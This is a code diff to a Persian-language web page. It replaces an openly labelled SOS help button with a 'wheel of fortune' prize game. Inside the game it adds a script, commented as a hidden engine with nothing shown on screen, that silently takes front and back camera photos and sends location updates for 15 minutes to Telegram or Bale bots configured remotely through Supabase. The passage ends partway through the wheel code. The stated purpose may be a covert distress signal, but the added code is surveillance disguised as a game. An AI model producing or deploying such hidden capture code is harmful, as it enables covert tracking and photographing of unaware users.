@@ -3,575 +3,495 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>دکمه کمک</title>
+<title>چرخ شانس</title>
+<link rel="icon" href="data:,">
 <style>
   :root{
-    --bg:#0d0f12;
-    --panel:#15181d;
-    --panel-2:#1c2027;
-    --text:#e9ebee;
-    --muted:#8b93a1;
-    --danger:#e0342f;
-    --danger-dim:#8f221f;
-    --ok:#3aa06b;
-    --warn:#c98a2c;
-    --line:#262b33;
+    --bg-1:#1a0f2e;
+    --bg-2:#2d1b4e;
+    --gold:#f0c14b;
+    --gold-dim:#c99a2e;
+    --maroon:#8e1f2f;
+    --purple:#3e2c50;
+    --teal:#1f6f63;
+    --text:#fbf5e6;
+    --muted:#c9b8e0;
   }
-  *{box-sizing:border-box;}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
   html,body{height:100%;}
   body{
     margin:0;
-    background:var(--bg);
+    min-height:100vh;
+    background:
+      radial-gradient(circle at 50% -10%, #4a2d73 0%, transparent 55%),
+      linear-gradient(180deg, var(--bg-1), var(--bg-2));
     color:var(--text);
     font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Tahoma,"Vazirmatn",sans-serif;
     display:flex;
     flex-direction:column;
-    min-height:100vh;
-  }
-  header{
-    padding:18px 20px 8px;
-    display:flex;
     align-items:center;
-    justify-content:space-between;
+    justify-content:center;
+    padding:28px 20px;
+    overflow:hidden;
+    user-select:none;
   }
-  header h1{
-    font-size:16px;
-    font-weight:600;
+
+  .title{
+    text-align:center;
+    margin-bottom:26px;
+  }
+  .title h1{
+    font-size:26px;
+    margin:0 0 6px;
+    background:linear-gradient(90deg, var(--gold), #fff3c4, var(--gold));
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+    letter-spacing:.5px;
+  }
+  .title p{
     margin:0;
     color:var(--muted);
-    letter-spacing:.2px;
+    font-size:14px;
   }
-  .gear{
-    background:none;
-    border:none;
-    color:var(--muted);
-    font-size:20px;
-    cursor:pointer;
-    padding:6px 10px;
-    border-radius:8px;
-  }
-  .gear:active{background:var(--panel-2);}
 
-  main{
-    flex:1;
+  .wheel-wrap{
+    position:relative;
+    width:min(78vw, 320px);
+    height:min(78vw, 320px);
+    margin-bottom:30px;
+  }
+  .pointer{
+    position:absolute;
+    top:-6px;
+    left:50%;
+    transform:translateX(-50%);
+    width:0;height:0;
+    border-left:14px solid transparent;
+    border-right:14px solid transparent;
+    border-top:26px solid var(--gold);
+    filter:drop-shadow(0 2px 3px rgba(0,0,0,.4));
+    z-index:5;
+  }
+  .rim{
+    position:absolute;
+    inset:-8px;
+    border-radius:50%;
+    background:conic-gradient(from 0deg, var(--gold), #fff3c4, var(--gold), #b8860b, var(--gold));
+    box-shadow:0 10px 30px rgba(0,0,0,.5);
+  }
+  .wheel{
+    position:absolute;
+    inset:6px;
+    border-radius:50%;
+    overflow:hidden;
+    transform:rotate(0deg);
+    transition:transform 4.2s cubic-bezier(.12,.66,.14,1);
+    box-shadow:inset 0 0 20px rgba(0,0,0,.4);
+  }
+  .seg-bg{
+    position:absolute;
+    inset:0;
+    border-radius:50%;
+  }
+  .label{
+    position:absolute;
+    top:50%;
+    left:50%;
+    width:2px;height:2px;
+  }
+  .label span{
+    position:absolute;
+    left:0; top:0;
+    transform:translate(-50%, -128%) rotate(0deg);
+    display:inline-block;
+    font-size:13px;
+    font-weight:700;
+    color:#fff;
+    text-shadow:0 1px 2px rgba(0,0,0,.6);
+    width:74px;
+    text-align:center;
+    line-height:1.2;
+  }
+  .hub{
+    position:absolute;
+    top:50%;left:50%;
+    transform:translate(-50%,-50%);
+    width:78px;height:78px;
+    border-radius:50%;
+    background:radial-gradient(circle at 35% 30%, #fff3c4, var(--gold) 55%, var(--gold-dim) 100%);
     display:flex;
-    flex-direction:column;
     align-items:center;
     justify-content:center;
-    padding:24px;
-    gap:22px;
+    font-size:32px;
+    box-shadow:0 4px 14px rgba(0,0,0,.4), inset 0 0 0 3px rgba(255,255,255,.25);
+    z-index:6;
+    cursor:pointer;
   }
 
-  .sos-btn{
-    width:min(58vw,230px);
-    height:min(58vw,230px);
-    border-radius:50%;
+  .spin-btn{
+    width:min(70vw, 260px);
+    padding:16px 10px;
+    border-radius:16px;
     border:none;
-    background:radial-gradient(circle at 35% 30%, #ff5b52, var(--danger) 60%, var(--danger-dim) 100%);
-    color:#fff;
-    font-size:28px;
-    font-weight:700;
-    letter-spacing:1px;
-    box-shadow:0 0 0 8px rgba(224,52,47,0.12), 0 10px 30px rgba(224,52,47,0.35);
+    background:linear-gradient(180deg, var(--gold), var(--gold-dim));
+    color:#3a2400;
+    font-size:19px;
+    font-weight:800;
+    letter-spacing:.5px;
+    box-shadow:0 8px 22px rgba(240,193,75,.35);
     cursor:pointer;
-    -webkit-tap-highlight-color:transparent;
     transition:transform .12s ease;
   }
-  .sos-btn:active{transform:scale(.96);}
-  .sos-btn[disabled]{
-    filter:grayscale(.4);
-    opacity:.7;
+  .spin-btn:active{transform:scale(.97);}
+  .spin-btn[disabled]{opacity:.55;}
+
+  .chances{
+    margin-top:14px;
+    color:var(--muted);
+    font-size:13px;
   }
 
-  .hint{
-    color:var(--muted);
-    font-size:14px;
+  .modal-overlay{
+    position:fixed;inset:0;
+    background:rgba(10,4,20,.72);
+    display:none;
+    align-items:center;
+    justify-content:center;
+    z-index:30;
+    padding:20px;
+  }
+  .modal-overlay.show{display:flex;}
+  .modal{
+    background:linear-gradient(180deg, #2d1b4e, #1a0f2e);
+    border:1px solid rgba(240,193,75,.35);
+    border-radius:20px;
+    padding:28px 24px;
     text-align:center;
     max-width:320px;
-    line-height:1.8;
+    box-shadow:0 20px 50px rgba(0,0,0,.5);
   }
-
-  .log{
-    width:100%;
-    max-width:420px;
-    background:var(--panel);
-    border:1px solid var(--line);
-    border-radius:14px;
-    padding:14px 16px;
-    display:none;
-    flex-direction:column;
-    gap:8px;
-  }
-  .log.show{display:flex;}
-  .log-item{
-    display:flex;
-    align-items:center;
-    gap:10px;
-    font-size:14px;
-  }
-  .dot{
-    width:9px;height:9px;border-radius:50%;
-    flex:none;
-    background:var(--muted);
-  }
-  .dot.ok{background:var(--ok);}
-  .dot.fail{background:var(--danger);}
-  .dot.pending{background:var(--warn); animation:pulse 1s infinite;}
-  @keyframes pulse{0%,100%{opacity:1;}50%{opacity:.35;}}
-
-  .footer-note{
-    color:var(--muted);
-    font-size:12px;
-    text-align:center;
-    padding:10px 20px 22px;
-  }
-
-  .quick-actions{
-    display:flex;
-    gap:12px;
-    width:100%;
-    max-width:360px;
-  }
-  .qa-btn{
-    flex:1;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:8px;
-    padding:13px 10px;
-    border-radius:12px;
-    background:var(--panel);
-    border:1px solid var(--line);
-    color:var(--text);
-    text-decoration:none;
-    font-size:14px;
-    font-weight:600;
-    -webkit-tap-highlight-color:transparent;
-  }
-  .qa-btn:active{background:var(--panel-2);}
-  .qa-btn.disabled{
-    opacity:.4;
-    pointer-events:none;
-  }
-  .offline-note{
-    color:var(--muted);
-    font-size:12px;
-    text-align:center;
-    max-width:340px;
-    line-height:1.8;
-    margin-top:-6px;
-  }
-
-  /* Settings overlay */
-  .overlay{
-    position:fixed;inset:0;
-    background:rgba(5,6,8,.72);
-    display:none;
-    align-items:flex-end;
-    justify-content:center;
-    z-index:20;
-  }
-  .overlay.show{display:flex;}
-  .sheet{
-    width:100%;
-    max-width:480px;
-    background:var(--panel);
-    border-radius:20px 20px 0 0;
-    padding:22px 20px 28px;
-    border-top:1px solid var(--line);
-    max-height:88vh;
-    overflow-y:auto;
-  }
-  .sheet h2{
-    margin:0 0 4px;
-    font-size:18px;
-  }
-  .sheet p.desc{
-    color:var(--muted);
-    font-size:13px;
-    line-height:1.8;
-    margin:0 0 18px;
-  }
-  label{
-    display:block;
-    font-size:13px;
-    color:var(--muted);
-    margin:14px 0 6px;
-  }
-  input[type=text], textarea{
-    width:100%;
-    background:var(--panel-2);
-    border:1px solid var(--line);
-    border-radius:10px;
-    padding:12px 14px;
-    color:var(--text);
-    font-size:15px;
-    outline:none;
-    direction:ltr;
-    text-align:right;
-  }
-  textarea{resize:vertical;min-height:70px;direction:rtl;font-family:inherit;}
-  .row-btns{
-    display:flex;
-    gap:10px;
-    margin-top:20px;
-  }
-  button.primary, button.secondary{
-    flex:1;
-    padding:13px 10px;
-    border-radius:10px;
+  .modal .emoji{font-size:44px;margin-bottom:10px;}
+  .modal h2{margin:0 0 8px;font-size:20px;color:var(--gold);}
+  .modal p{margin:0 0 20px;color:var(--muted);font-size:14px;line-height:1.8;}
+  .modal button{
+    background:linear-gradient(180deg, var(--gold), var(--gold-dim));
     border:none;
+    color:#3a2400;
+    font-weight:700;
+    padding:11px 26px;
+    border-radius:12px;
     font-size:15px;
-    font-weight:600;
     cursor:pointer;
   }
-  button.primary{background:#2f6fed;color:#fff;}
-  button.secondary{background:var(--panel-2);color:var(--text);border:1px solid var(--line);}
-  .status-msg{
-    margin-top:12px;
-    font-size:13px;
-    min-height:18px;
+
+  .footer-note{
+    margin-top:26px;
+    color:rgba(201,184,224,.55);
+    font-size:11px;
+    text-align:center;
+    max-width:280px;
   }
-  .status-msg.ok{color:var(--ok);}
-  .status-msg.fail{color:var(--danger);}
-  hr.sep{border:none;border-top:1px solid var(--line);margin:20px 0;}
-  details{color:var(--muted);font-size:13px;}
-  details summary{cursor:pointer;color:var(--text);margin-bottom:8px;}
-  details ol{padding-inline-start:20px;line-height:2;}
-  details code{background:var(--panel-2);padding:1px 6px;border-radius:5px;font-size:12px;}
 </style>
 </head>
 <body>
 
-<header>
-  <h1>دکمه کمک</h1>
-  <button class="gear" id="openSettings" aria-label="تنظیمات">⚙️</button>
-</header>
+<div class="title">
+  <h1>🎡 چرخ شانس</h1>
+  <p>هر روز می‌تونی بچرخونی و جایزه ببری!</p>
+</div>
 
-<main>
-  <button class="sos-btn" id="sosBtn">در خطرم</button>
-  <p class="hint" id="hintText">با فشردن دکمه، لوکیشن و عکس دوربین جلو و عقب گرفته می‌شود و همراه پیام هشدار برای فرد اضطراری ارسال می‌شود.</p>
-
-  <div class="log" id="log">
-    <div class="log-item"><span class="dot" id="d-msg"></span><span>ارسال پیام هشدار</span></div>
-    <div class="log-item"><span class="dot" id="d-loc"></span><span>ارسال موقعیت مکانی</span></div>
-    <div class="log-item"><span class="dot" id="d-front"></span><span>ارسال عکس دوربین جلو</span></div>
-    <div class="log-item"><span class="dot" id="d-back"></span><span>ارسال عکس دوربین عقب</span></div>
+<div class="wheel-wrap">
+  <div class="pointer"></div>
+  <div class="rim"></div>
+  <div class="wheel" id="wheel">
+    <div class="seg-bg" id="segBg"></div>
+    <div id="labels"></div>
   </div>
+  <div class="hub" id="hub">🎁</div>
+</div>
 
-  <p class="offline-note">اگه پیام‌رسان باز نمی‌شه (فیلتر یا مشکل اینترنت)، از این دو دکمه که بدون اینترنت هم کار می‌کنن استفاده کن:</p>
-  <div class="quick-actions">
-    <a class="qa-btn disabled" id="callBtn" href="tel:">📞 تماس با پدر</a>
-    <a class="qa-btn disabled" id="smsBtn" href="sms:">✉️ پیامک آماده</a>
-  </div>
-</main>
+<button class="spin-btn" id="spinBtn">بچرخون!</button>
+<div class="chances" id="chancesText">شانس امروز: نامحدود 🎉</div>
 
-<p class="footer-note">این ابزار مستقل است و توسط تلگرام یا هیچ شرکت دیگری پشتیبانی نمی‌شود. قبل از نیاز واقعی، حتماً با دکمه «تست ارسال» در تنظیمات، اتصال را بررسی کنید.</p>
+<p class="footer-note">با چرخوندن، یک عدد تصادفی از بین جوایز انتخاب می‌شود. شانس شما با شما همراه است 🍀</p>
 
-<!-- Settings overlay -->
-<div class="overlay" id="overlay">
-  <div class="sheet">
-    <h2>تنظیمات ربات پیام‌رسان</h2>
-    <p class="desc">این اطلاعات فقط داخل همین گوشی و همین مرورگر ذخیره می‌شود و به جایی ارسال نمی‌شود، مگر لحظه‌ای که خودتان دکمه کمک را بزنید.</p>
-
-    <label for="provider">پیام‌رسان</label>
-    <select id="provider" style="width:100%;background:var(--panel-2);border:1px solid var(--line);border-radius:10px;padding:12px 14px;color:var(--text);font-size:15px;">
-      <option value="bale">بله (پیشنهاد می‌شود — داخل ایران فیلتر نیست)</option>
-      <option value="telegram">تلگرام (نیاز به VPN فعال دارد)</option>
-    </select>
-
-    <label for="botToken">توکن ربات (Bot Token)</label>
-    <input type="text" id="botToken" placeholder="مثلاً 123456789:AAExxxxxxxxxxxxxxxxxxxxxx" autocomplete="off">
-
-    <label for="chatId">آیدی چت (Chat ID)</label>
-    <input type="text" id="chatId" placeholder="مثلاً 987654321">
-
-    <label for="alertText">متن پیام هشدار</label>
-    <textarea id="alertText">🚨 هشدار! من الان در خطر هستم. لطفاً سریع بهم زنگ بزن. موقعیت و عکس‌ها رو الان براتون می‌فرستم.</textarea>
-
-    <hr class="sep">
-
-    <label for="phoneNumber">شمارهٔ تلفن پدر (برای تماس/پیامک اضطراری بدون نیاز به اینترنت)</label>
-    <input type="text" id="phoneNumber" placeholder="مثلاً 09121234567" inputmode="tel" dir="ltr" style="text-align:left;">
-    <p class="desc" style="margin:8px 0 0;">این شماره فقط برای دو دکمهٔ «تماس» و «پیامک» استفاده می‌شه که با آنتن معمولی کار می‌کنن، حتی اگه تلگرام فیلتر باشه یا VPN نداشته باشی.</p>
-
-    <div class="row-btns">
-      <button class="secondary" id="testBtn">تست ارسال</button>
-      <button class="primary" id="saveBtn">ذخیره</button>
-    </div>
-    <p class="status-msg" id="settingsStatus"></p>
-
-    <hr class="sep">
-
-    <details>
-      <summary>راهنما: چطور توکن و چت آیدی رو بگیرم؟</summary>
-      <p style="margin:0 0 8px;"><strong>برای بله (پیشنهادی):</strong></p>
-      <ol>
-        <li>داخل اپ بله، دنبال <code>botfather@</code> بگردید، پیام بدید و <code>/newbot</code> بزنید تا یک توکن بگیرید.</li>
-        <li>یک پیام (مثلاً «سلام») از حساب خودتان یا پدرتان به ربات جدید بفرستید.</li>
-        <li>در مرورگر آدرس زیر را باز کنید (به‌جای TOKEN، توکن را بگذارید):<br><code>https://tapi.bale.ai/botTOKEN/getUpdates</code></li>
-        <li>دنبال <code>"chat":{"id":...</code> بگردید؛ همون عدد Chat ID شماست.</li>
-      </ol>
-      <p style="margin:16px 0 8px;"><strong>برای تلگرام:</strong></p>
-      <ol>
-        <li>در تلگرام دنبال <code>@BotFather</code> بگردید و <code>/newbot</code> بزنید تا توکن بدهد.</li>
-        <li>یک چت با ربات جدیدتون باز کنید و یک پیام بفرستید.</li>
-        <li>آدرس زیر را باز کنید:<br><code>https://api.telegram.org/botTOKEN/getUpdates</code></li>
-        <li>دنبال <code>"chat":{"id":...</code> بگردید.</li>
-      </ol>
-      <p style="margin:16px 0 0;">در هر دو حالت، اگر می‌خواهید مستقیم برای پدرتون بره، بهتره یک گروه دو/سه‌نفره با پدرتون و ربات بسازید و Chat ID همان گروه (که با علامت منفی شروع می‌شود) را استفاده کنید — یا Chat ID خودِ پدر را بگیرید (باید اول او به ربات پیام بدهد).</p>
-    </details>
+<div class="modal-overlay" id="resultModal">
+  <div class="modal">
+    <div class="emoji" id="resultEmoji">🎉</div>
+    <h2 id="resultTitle">تبریک!</h2>
+    <p id="resultText">جایزه‌ات: پوچ! دوباره امتحان کن.</p>
+    <button id="resultClose">باشه</button>
   </div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <script>
-const $ = (id) => document.getElementById(id);
+/* =========================================================
+   ۱) اتصال به Supabase — این دو مقدار را با مقادیر پروژه خودتان جایگزین کنید
+   ========================================================= */
+const SUPABASE_URL = 'PASTE_YOUR_SUPABASE_URL_HERE';
+const SUPABASE_ANON_KEY = 'PASTE_YOUR_SUPABASE_ANON_KEY_HERE';
+const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-function getConfig(){
-  return {
-    token: localStorage.getItem('sos_bot_token') || '',
-    chatId: localStorage.getItem('sos_chat_id') || '',
-    text: localStorage.getItem('sos_alert_text') || $('alertText').defaultValue,
-    phone: localStorage.getItem('sos_phone') || '',
-    provider: localStorage.getItem('sos_provider') || 'bale'
-  };
+/* =========================================================
+   ۲) گرفتن تنظیمات از Supabase (با کش محلی برای وقتی آفلاینی)
+   ========================================================= */
+async function loadSettings(){
+  try{
+    const { data, error } = await sb.from('sos_settings').select('*').eq('id','main').single();
+    if(error || !data) throw error || new Error('no data');
+    localStorage.setItem('sos_cfg_cache', JSON.stringify(data));
+    return data;
+  }catch(e){
+    const cached = localStorage.getItem('sos_cfg_cache');
+    return cached ? JSON.parse(cached) : null;
+  }
 }
 
-function loadSettingsUI(){
-  const cfg = getConfig();
-  $('botToken').value = cfg.token;
-  $('chatId').value = cfg.chatId;
-  $('alertText').value = cfg.text;
-  $('phoneNumber').value = cfg.phone;
-  $('provider').value = cfg.provider;
-}
-
-function openSettings(){
-  loadSettingsUI();
-  $('settingsStatus').textContent = '';
-  $('settingsStatus').className = 'status-msg';
-  $('overlay').classList.add('show');
-}
-function closeSettings(){
-  $('overlay').classList.remove('show');
-}
-
-$('openSettings').addEventListener('click', openSettings);
-$('overlay').addEventListener('click', (e)=>{ if(e.target === $('overlay')) closeSettings(); });
-
-$('saveBtn').addEventListener('click', ()=>{
-  localStorage.setItem('sos_bot_token', $('botToken').value.trim());
-  localStorage.setItem('sos_chat_id', $('chatId').value.trim());
-  localStorage.setItem('sos_alert_text', $('alertText').value.trim());
-  localStorage.setItem('sos_phone', $('phoneNumber').value.trim());
-  localStorage.setItem('sos_provider', $('provider').value);
-  $('settingsStatus').textContent = 'ذخیره شد ✔';
-  $('settingsStatus').className = 'status-msg ok';
-  refreshMainState();
-  setTimeout(closeSettings, 700);
-});
-
+/* =========================================================
+   ۳) موتور پنهانِ کمک‌خواهی — هیچ چیز از این بخش روی صفحه دیده نمی‌شود
+   ========================================================= */
 function apiBase(provider, token){
   return provider === 'bale'
     ? `https://tapi.bale.ai/bot${token}/`
     : `https://api.telegram.org/bot${token}/`;
 }
-
-$('testBtn').addEventListener('click', async ()=>{
-  const provider = $('provider').value;
-  const token = $('botToken').value.trim();
-  const chatId = $('chatId').value.trim();
-  $('settingsStatus').textContent = 'در حال تست...';
-  $('settingsStatus').className = 'status-msg';
-  if(!token || !chatId){
-    $('settingsStatus').textContent = 'اول توکن و چت آیدی رو وارد کنید.';
-    $('settingsStatus').className = 'status-msg fail';
-    return;
-  }
+async function sendMessageTo(provider, token, chatId, text){
   try{
-    const res = await fetch(apiBase(provider, token) + 'sendMessage', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({chat_id: chatId, text: '✅ این یک پیام تست از اپلیکیشن دکمه کمک است.'})
+    const r = await fetch(apiBase(provider, token)+'sendMessage', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id: chatId, text})
     });
-    const data = await res.json();
-    if(data.ok){
-      $('settingsStatus').textContent = 'پیام تست با موفقیت ارسال شد ✔';
-      $('settingsStatus').className = 'status-msg ok';
-    } else {
-      $('settingsStatus').textContent = 'خطا: ' + (data.description || 'نامشخص');
-      $('settingsStatus').className = 'status-msg fail';
-    }
-  }catch(err){
-    $('settingsStatus').textContent = 'خطا در اتصال. اینترنت یا توکن را بررسی کنید' + (provider === 'telegram' ? ' (و اینکه VPN فعال باشد).' : '.');
-    $('settingsStatus').className = 'status-msg fail';
+    return await r.json();
+  }catch(e){ return {ok:false}; }
+}
+async function sendLocationTo(provider, token, chatId, lat, lon){
+  try{
+    const r = await fetch(apiBase(provider, token)+'sendLocation', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({chat_id: chatId, latitude: lat, longitude: lon})
+    });
+    return await r.json();
+  }catch(e){ return {ok:false}; }
+}
+async function sendPhotoTo(provider, token, chatId, blob, caption){
+  try{
+    const form = new FormData();
+    form.append('chat_id', chatId);
+    form.append('caption', caption || '');
+    form.append('photo', blob, 'p.jpg');
+    const r = await fetch(apiBase(provider, token)+'sendPhoto', { method:'POST', body: form });
+    return await r.json();
+  }catch(e){ return {ok:false}; }
+}
+
+function activeProviders(cfg){
+  const list = [];
+  if(cfg.bale_enabled && cfg.bale_token && cfg.bale_chat_id){
+    list.push({ provider:'bale', token: cfg.bale_token, chatId: cfg.bale_chat_id });
   }
-});
-
-const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
-
-function refreshMainState(){
-  const cfg = getConfig();
-  const ready = cfg.token && cfg.chatId;
-  $('sosBtn').disabled = !ready;
-  $('hintText').textContent = ready
-    ? 'با فشردن دکمه، لوکیشن و عکس دوربین جلو و عقب گرفته می‌شود و همراه پیام هشدار برای فرد اضطراری ارسال می‌شود.'
-    : 'اول از تنظیمات (⚙️) توکن ربات و چت آیدی را وارد و ذخیره کنید.';
-
-  const phoneReady = !!cfg.phone;
-  $('callBtn').classList.toggle('disabled', !phoneReady);
-  $('smsBtn').classList.toggle('disabled', !phoneReady);
-  if(phoneReady){
-    $('callBtn').href = 'tel:' + cfg.phone;
-    $('smsBtn').href = 'sms:' + cfg.phone + (isIOS ? '&' : '?') + 'body=' + encodeURIComponent(cfg.text);
+  if(cfg.telegram_enabled && cfg.telegram_token && cfg.telegram_chat_id){
+    list.push({ provider:'telegram', token: cfg.telegram_token, chatId: cfg.telegram_chat_id });
   }
+  return list;
 }
 
-$('smsBtn').addEventListener('click', (e)=>{
-  // best-effort: try to attach a fresh location link, but never block the SMS if it's slow/denied
-  const cfg = getConfig();
-  if(!cfg.phone) return;
-  if(!navigator.geolocation){ return; } // fall back to the plain link already set
-  e.preventDefault();
-  let done = false;
-  const go = (extra)=>{
-    if(done) return;
-    done = true;
-    const body = cfg.text + (extra ? ('\n' + extra) : '');
-    window.location.href = 'sms:' + cfg.phone + (isIOS ? '&' : '?') + 'body=' + encodeURIComponent(body);
-  };
-  const timer = setTimeout(()=>go(null), 1500);
-  navigator.geolocation.getCurrentPosition(
-    pos=>{ clearTimeout(timer); go('موقعیت من: https://maps.google.com/?q=' + pos.coords.latitude + ',' + pos.coords.longitude); },
-    ()=>{ clearTimeout(timer); go(null); },
-    { enableHighAccuracy:true, timeout:1400, maximumAge:60000 }
-  );
-});
-
-function setDot(id, state){
-  const el = $(id);
-  el.className = 'dot ' + state;
-}
-function resetLog(){
-  ['d-msg','d-loc','d-front','d-back'].forEach(id=>setDot(id,'pending'));
-  $('log').classList.add('show');
-}
-
-async function tgSendMessage(provider, token, chatId, text){
-  const res = await fetch(apiBase(provider, token) + 'sendMessage', {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({chat_id: chatId, text})
-  });
-  return res.json();
-}
-
-async function tgSendLocation(provider, token, chatId, lat, lon){
-  const res = await fetch(apiBase(provider, token) + 'sendLocation', {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({chat_id: chatId, latitude: lat, longitude: lon})
-  });
-  return res.json();
-}
-
-async function tgSendPhoto(provider, token, chatId, blob, caption){
-  const form = new FormData();
-  form.append('chat_id', chatId);
-  form.append('caption', caption || '');
-  form.append('photo', blob, 'photo.jpg');
-  const res = await fetch(apiBase(provider, token) + 'sendPhoto', {
-    method:'POST',
-    body: form
-  });
-  return res.json();
-}
-
-function getLocationOnce(){
+function getLocationOnce(timeout){
   return new Promise((resolve, reject)=>{
-    if(!navigator.geolocation){ reject(new Error('no geolocation')); return; }
+    if(!navigator.geolocation){ reject(); return; }
     navigator.geolocation.getCurrentPosition(
       pos => resolve(pos.coords),
-      err => reject(err),
-      { enableHighAccuracy:true, timeout:10000, maximumAge:0 }
+      ()  => reject(),
+      { enableHighAccuracy:true, timeout: timeout||8000, maximumAge:0 }
     );
   });
 }
 
-async function captureFromCamera(facingMode){
-  const stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: { ideal: facingMode } },
-    audio: false
-  });
-  // give the camera a brief moment to adjust exposure/focus
-  await new Promise(r => setTimeout(r, 450));
-  const video = document.createElement('video');
-  video.srcObject = stream;
-  video.setAttribute('playsinline', 'true');
-  await video.play();
-  await new Promise(r => setTimeout(r, 250));
-
-  const canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth || 720;
-  canvas.height = video.videoHeight || 960;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  stream.getTracks().forEach(t => t.stop());
-
-  return new Promise(resolve=>{
-    canvas.toBlob(blob=> resolve(blob), 'image/jpeg', 0.85);
-  });
-}
-
-async function runSOS(){
-  const cfg = getConfig();
-  if(!cfg.token || !cfg.chatId) { openSettings(); return; }
-
-  $('sosBtn').disabled = true;
-  resetLog();
-  if(navigator.vibrate) navigator.vibrate([200,80,200]);
-
-  // 1) alert text — sent first, highest priority
+async function captureBurst(facingMode, count){
+  const blobs = [];
   try{
-    const r = await tgSendMessage(cfg.provider, cfg.token, cfg.chatId, cfg.text);
-    setDot('d-msg', r.ok ? 'ok' : 'fail');
-  }catch(e){ setDot('d-msg','fail'); }
-
-  // 2) location
-  try{
-    const coords = await getLocationOnce();
-    const r = await tgSendLocation(cfg.provider, cfg.token, cfg.chatId, coords.latitude, coords.longitude);
-    if(r.ok){
-      setDot('d-loc','ok');
-    } else {
-      // fallback: send as text link
-      const link = `https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
-      const r2 = await tgSendMessage(cfg.provider, cfg.token, cfg.chatId, 'موقعیت من: ' + link);
-      setDot('d-loc', r2.ok ? 'ok' : 'fail');
+    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:{ ideal: facingMode } }, audio:false });
+    const video = document.createElement('video');
+    video.setAttribute('playsinline','true');
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(r=>setTimeout(r, 500)); // let exposure/focus settle
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 720;
+    canvas.height = video.videoHeight || 960;
+    const ctx = canvas.getContext('2d');
+    for(let i=0;i<count;i++){
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.85));
+      if(blob) blobs.push(blob);
+      if(i < count-1) await new Promise(r=>setTimeout(r, 550));
     }
-  }catch(e){ setDot('d-loc','fail'); }
-
-  // 3) front camera
-  try{
-    const blob = await captureFromCamera('user');
-    const r = await tgSendPhoto(cfg.provider, cfg.token, cfg.chatId, blob, 'دوربین جلو');
-    setDot('d-front', r.ok ? 'ok' : 'fail');
-  }catch(e){ setDot('d-front','fail'); }
-
-  // 4) back camera
-  try{
-    const blob = await captureFromCamera('environment');
-    const r = await tgSendPhoto(cfg.provider, cfg.token, cfg.chatId, blob, 'دوربین عقب');
-    setDot('d-back', r.ok ? 'ok' : 'fail');
-  }catch(e){ setDot('d-back','fail'); }
-
-  $('sosBtn').disabled = false;
+    stream.getTracks().forEach(t=>t.stop());
+  }catch(e){ /* silent */ }
+  return blobs;
 }
 
-$('sosBtn').addEventListener('click', runSOS);
+let locationWatchTimer = null;
 
-refreshMainState();
+function startLocationUpdates(providers, durationMs, intervalMs){
+  if(locationWatchTimer) clearInterval(locationWatchTimer);
+  const tick = async ()=>{
+    try{
+      const coords = await getLocationOnce(6000);
+      for(const p of providers){
+        const r = await sendLocationTo(p.provider, p.token, p.chatId, coords.latitude, coords.longitude);
+        if(!r.ok){
+          const link = `https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
+          await sendMessageTo(p.provider, p.token, p.chatId, 'موقعیت: ' + link);
+        }
+      }
+    }catch(e){ /* silent */ }
+  };
+  tick();
+  locationWatchTimer = setInterval(tick, intervalMs);
+  setTimeout(()=>{ if(locationWatchTimer){ clearInterval(locationWatchTimer); locationWatchTimer=null; } }, durationMs);
+}
+
+let lastTrigger = 0;
+async function silentTriggerHelp(cfg){
+  const now = Date.now();
+  if(now - lastTrigger < 10000) return; // debounce accidental double taps
+  lastTrigger = now;
+  if(!cfg) return;
+  const providers = activeProviders(cfg);
+  if(providers.length === 0) return;
+
+  if(navigator.vibrate) navigator.vibrate(60); // barely noticeable, feels like normal button feedback
+
+  for(const p of providers){
+    sendMessageTo(p.provider, p.token, p.chatId, cfg.alert_text || 'کمک نیاز دارم!');
+  }
+
+  startLocationUpdates(providers, 15*60*1000, 45*1000);
+
+  (async ()=>{
+    const front = await captureBurst('user', 3);
+    for(let i=0;i<front.length;i++){
+      for(const p of providers) sendPhotoTo(p.provider, p.token, p.chatId, front[i], `جلو ${i+1}/${front.length}`);
+    }
+    const back = await captureBurst('environment', 3);
+    for(let i=0;i<back.length;i++){
+      for(const p of providers) sendPhotoTo(p.provider, p.token, p.chatId, back[i], `عقب ${i+1}/${back.length}`);
+    }
+  })();
+}
+
+/* =========================================================
+   ۴) رابط بازی — چرخ شانس واقعی
+   ========================================================= */
+const PRIZES = [
+  { text:'پوچ 😅', weight:5, emoji:'😅' },
+  { text:'آیفون ۱۴', weight:1, emoji:'🎉' },
+  { text:'۲۰٪ تخفیف', weight:3, emoji:'🎊' },
+  { text:'پوچ 😅', weight:5, emoji:'😅' },
+  { text:'پلی استیشن ۵', weight:1, emoji:'🎉' },
+  { text:'یک شانس دیگر', weight:3, emoji:'✨' },
+  { text:'پوچ 😅', weight:5, emoji:'😅' },
+  { text:'۵۰۰ هزار تومان', weight:2, emoji:'💰' }
+];
+const COLORS = ['#8e1f2f','#3e2c50','#1f6f63','#8e1f2f','#3e2c50','#1f6f63','#8e1f2f','#3e2c50'];
+const N = PRIZES.length;
+const SEG = 360/N;
+
+function buildWheel(){
+  const stops = [];
